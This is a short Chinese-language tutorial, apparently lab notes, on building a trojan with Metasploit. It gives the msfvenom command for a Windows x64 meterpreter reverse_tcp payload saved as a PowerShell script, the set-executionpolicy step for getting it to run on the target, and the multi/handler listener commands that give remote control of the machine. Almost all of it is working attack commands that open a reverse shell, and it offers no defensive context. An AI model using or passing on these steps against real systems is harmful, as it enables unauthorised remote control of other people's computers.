# msf构建木马



#### 1、生成木马

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.63.128 LPORT=4444 -f psh-reflection >1.ps1
```

#### 2、上传靶机并执行木马

.ps1脚本文件不一定能执行成功

比如提示“在此系统中禁止执行脚本“

需要以管理员身份打开powershell执行

```
set-executionpolicy remotesigned
```

然后Y

#### 3、设置并打开监听

```
msfconsole

use exploit/multi/handler

set payload windows/x64/meterpreter/reverse_tcp

set LHOST 192.168.63.128

set LPORT 4444

run
```

就能远程控制靶机